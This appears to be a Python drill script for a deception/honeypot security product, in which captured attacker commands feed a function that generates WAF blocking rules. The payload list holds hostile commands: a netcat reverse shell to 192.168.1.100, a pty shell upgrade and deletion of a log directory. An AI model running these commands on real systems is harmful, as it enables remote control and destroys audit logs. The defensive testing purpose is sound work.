import sys
import os

base_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(base_dir)

from app.agents.shadow_model import synthesize_mirror_reality_countermeasure

def main():
    sys.stdout.reconfigure(encoding='utf-8')
    print("==================================================================")
    print("PHASE 31 TEST: AUTOMATED COUNTER-MEASURE SYNTHESIS")
    print("Target: Phase 31.4 - Active Deception Orchestration (OODA Loop)")
    print("==================================================================\n")
    
    mirror_session_id = "MIRROR-7b99d12a-4f55-4b11-9a99-9b9b9b9b9b9b"
    
    print("[SYSTEM] An APT is currently trapped in the Mirror Reality Honeypot.")
    print("[SYSTEM] They believe they are inside the production container and are executing payloads.\n")
    
    # Telemetry gathered from the honeypot
    attacker_payloads = [
        "ls -la /var/www",
        "rm -rf /var/log/guardrail",
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "nc -e /bin/sh 192.168.1.100 4444"
    ]
    
    print("------------------------------------------------------------------")
    print("[MIRROR REALITY] Captured the following execution telemetry:")
    for payload in attacker_payloads:
        print(f"  -> {payload}")
    print("------------------------------------------------------------------")
    
    # 1. Synthesis Phase
    print("\n[SYSTEM] Triggering the Shadow Model OODA Loop to analyze TTPs...")
    synthesized_rule = synthesize_mirror_reality_countermeasure(mirror_session_id, attacker_payloads)
    
    print(f"\n[API GATEWAY] Pushing dynamic WAF proxy rule across the global edge network:\n{synthesized_rule}")
    
    print("\n==================================================================")
    print("DRILL RESULTS: THREAT INTELLIGENCE SYNTHESIZED")
    print("==================================================================")
    print("Outcome: The Shadow Model analyzed the attacker's behavior in the sandbox and dynamically generated blocking signatures for their specific reverse-shell TTPs.")
    print("For the Board of Directors: Successfully demonstrated Phase 31.4. Guardrail.ai uses attackers as free penetration testers, automatically hardening the entire global network against their novel techniques before they even realize they are trapped.")
    print("==================================================================")

if __name__ == "__main__":
    main()
